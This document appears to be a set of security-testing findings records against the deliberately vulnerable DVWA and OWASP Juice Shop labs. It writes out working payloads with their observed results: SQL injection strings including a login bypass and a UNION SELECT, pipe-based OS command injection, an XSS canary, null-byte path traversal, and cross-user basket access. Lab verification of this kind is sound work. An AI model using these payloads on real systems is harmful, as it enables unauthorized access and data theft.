findings.title: SQL Injection via 'id' parameter in DVWA SQLi page (security=low)
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user rows: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — raw pre_blocks confirmed multiple surnames: admin, Brown, Me, Picasso, Smith. FALSE payload id=1' AND '1'='2 returned zero rows (visible_text shows only 'User ID:' with no First name/Surname entries, pre_blocks array absent/empty). This boolean-based differential confirms unsanitized string concatenation of the id parameter into the SQL query.

findings.title: [security=high] OS Command Injection via pipe (no trailing space) bypass on DVWA exec/ip
request_sequence: GET http://dvwa/vulnerabilities/exec/ (confirm form, footer shows Security Level: high)
findings.response_evidence: [security=high] Response footer confirms 'Security Level: high'. The high-level blacklist strips '; ', '| ' (pipe+space) and '&&', but a pipe with no trailing space bypasses it. Submitted ip=127.0.0.1|whoami produced output containing the literal web-process identity string 'www-data' in the rendered <pre> block: pre_blocks=[\"www-data\"], visible_text snippet: 'Enter an IP address: www-data'. This proves arbitrary OS command execution (whoami) on the server via the ip parameter at high security.

findings.title: [security=high] Stored XSS canary on DVWA xss_s/mtxMessage — REJECTED (tags stripped by high-level filter)
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (confirm form, footer shows Security Level: high)

POST http://dvwa/vulnerabilities/xss_s/ with form_data={txtName: 'verifier2', mtxMessage: '<script id="t">xss_flag=1</script>', btnSign: 'Sign Guestbook'} (footer confirmed Security Level: high at submission time)
findings.response_evidence:
[security=high] At the time of submission the page footer read 'Security Level: high'. The newly stored guestbook entry for name 'verifier2' rendered as:
Name: verifier2
Message: xss_flag=1
— the tag that still executes client-side (browser_eval_js showed window.xss_flag==1), but that record was NOT created by a submission at the current high security level — it is residual data from an earlier/lower-security test still present in the shared guestbook table, not evidence that the high-security filter is bypassable. My own high-security submission confirms the mtxMessage field IS sanitized (tag-stripping, consistent with PHP strip_tags()) at high, so stored XSS via this endpoint at high is NOT reproducible/confirmed for new injections.
findings.browser_js_evidence: window.xss_flag evaluated to 1 ONLY due to the pre-existing unrelated 'tester' record's raw unstripped <script> tag already present in the DB from a prior lower-security submission; it is not attributable to the high-security mtxMessage filter being bypassed by the newly submitted verifier2 canary, whose script tags were stripped as shown in the DOM excerpt above.

findings.title: SQL Injection via numeric boolean bypass on DVWA sqli page (POST id) [security=medium]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security level is currently: medium'
GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin) -> confirmed id is now a POST <select> dropdown (1-5)
findings.response_evidence: [security=medium] At medium, quotes are escaped server-side so a quote-based payload fails, but an unquoted numeric boolean injection succeeds because the id value is concatenated directly into the SQL query without quoting. TRUE payload id=1 OR 1=1 returned all 5 seeded user records: surnames 'admin', 'Brown', 'Me', 'Picasso', 'Smith' (first names admin, Gordon, Hack, Pablo, Bob respectively) in pre_blocks. FALSE payload id=1 AND 1=2 returned zero records (no ID/First name/Surname blocks present, only the empty User ID dropdown). This differential behavior (multiple seeded rows vs. zero rows) confirms boolean-based SQL injection at medium security.

findings.title: [security=high] SQL Injection via out-of-band session-input.php id parameter with trailing-comment LIMIT bypass
request_sequence: GET http://dvwa/vulnerabilities/sqli/ -> observe results for TRUE
GET http://dvwa/vulnerabilities/sqli/ -> observe results for FALSE
findings.response_evidence: [security=high] Page footer confirms 'Security Level: high' throughout. At high security, /vulnerabilities/sqli/ exposes no direct id form; the id is set out-of-band via session-input.php and consumed on the next GET of /vulnerabilities/sqli/ (query appends LIMIT 1, requiring a trailing comment to neutralize it). TRUE payload id=1' OR '1'='1' # caused /vulnerabilities/sqli/ to render FIVE seeded user records (bypassing the LIMIT 1 via the UNION-like boolean OR across all rows): First name: admin / Surname: admin; First name: Gordon / Surname: Brown; First name: Hack / Surname: Me; First name: Pablo / Surname: Picasso; First name: Bob / Surname: Smith. FALSE payload id=1' AND '1'='2' # caused /vulnerabilities/sqli/ to render zero records (visible_text showed only 'Click here to change your ID .' with no First name/Surname rows). This TRUE(multiple rows)/FALSE(zero rows) differential confirms SQL injection in the id parameter processed via session-input.php at high security.

findings.title: Cross-User Basket Access (BOLA) via GET /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> 200, returned basket id=6 UserId=22 with Products=[Apple Juice (1000ml) qty=3]
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, a DIFFERENT basket) -> 200, returned the SAME basket id=6 UserId=22 with Products=[Apple Juice (1000ml) qty=3]
findings.response_evidence: acct1 request: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"BasketId":6,"quantity":3}}]}}. acct2 request (session_info.own_basket_id=7, confirming acct2's own basket is different) to GET /rest/basket/6 returned IDENTICAL data: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"BasketId":6,"quantity":3}}]}} with HTTP 200 and no authorization error. This proves acct2 can read acct1's basket contents (Apple Juice 1000ml, qty 3) despite not owning it - no ownership/ACL check enforced on the basket id path parameter.

findings.title: Authentication Bypass via SQL Injection on Login Endpoint
findings.response_evidence: HTTP 200 response: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email field ' OR 1=1-- caused the backend SQL WHERE clause to always evaluate true, returning the FIRST user record in the users table (admin@juice-sh.op, id/basket bid=1) and issuing a valid authentication JWT token for that account without knowing the real admin password - confirming classic SQLi auth bypass.

findings.title: SQL Injection in Product Search Endpoint
findings.response_evidence: Request 1 (single quote q=qwert'): HTTP 500 with body 'Error: SQLITE_ERROR: near \"'%'\": syntax error' - proves the q parameter is concatenated unsanitized into a raw SQL query, causing a database syntax error and leaking the underlying SQLITE_ERROR to the client. Request 2 (9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200 with body {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} - the literal integers 1-9 supplied in the UNION SELECT were reflected directly into the JSON response fields (name:2, description:3, etc.), proving successful injection of an attacker-controlled UNION SELECT into the search query's SQL statement with a correctly matched 9-column schema.

findings.title: Open Directory Listing on /ftp/ Exposes Confidential Acquisitions Memo
findings.response_evidence:
Step 1: GET /ftp/ returned HTTP 200 text/html with a directory listing (serve-index style) enumerating files including 'acquisitions.md 909 bytes', 'announcement_encrypted.md', 'coupons_2013.md.bak', 'legal.md', 'package.json.bak', 'incident-support.kdbx', 'suspicious_errors.yml' -- confirming an open/browsable directory with no authentication required.

Step 2: GET /ftp/acquisitions.md returned HTTP 200 text/markdown with body content:
\"# Planned Acquisitions\n\n> This document is confidential! Do not distribute!\n\nOur company plans to acquire several competitors within the next year.\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.\"

This confirms both (a) the directory is openly listable without authentication, and (b) the listed document is directly retrievable and contains explicit confidential business content ('This document is confidential! Do not distribute!' / planned competitor acquisitions / stock market impact), satisfying CWE-200 verification criteria.

findings.title: Poison Null-Byte Path Traversal bypasses .bak file extension filter in /ftp/ file server
findings.response_evidence:
Step 1: GET /ftp/package.json.bak returned HTTP 403 with body: "Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)" confirming the raw .bak extension is blocked by the fileServer.js verify() filter.

Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200 with content-type application/octet-stream, and the actual package.json file content was returned, e.g.:
"{\n  \"name\": \"juice-shop\",\n  \"version\": \"6.2.0-SNAPSHOT\",\n  \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": {...\"sqlite3\": \"~3.1.13\"...}}"

This proves the extension-check (which evaluates the path truncated at the null byte, seeing '.md') is bypassed while the underlying filesystem read uses the full raw path including '.bak', allowing retrieval of the restricted backup file despite the extension filter rejecting direct access.

findings.title: Exposed Encryption Keys Directory via browsable directory listing
request_sequence: GET http://juiceshop:3000/encryptionkeys/ with Accept: text/html,application/json -> HTTP 200 directory listing
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 with a serve-index-generated browsable directory listing. Visible text extracted from the response: \"listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM\". Links present in the page included direct URLs to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, confirming the directory is unauthenticated and browsable and discloses sensitive key material filenames (JWT public key and premium feature private key) without any access control.
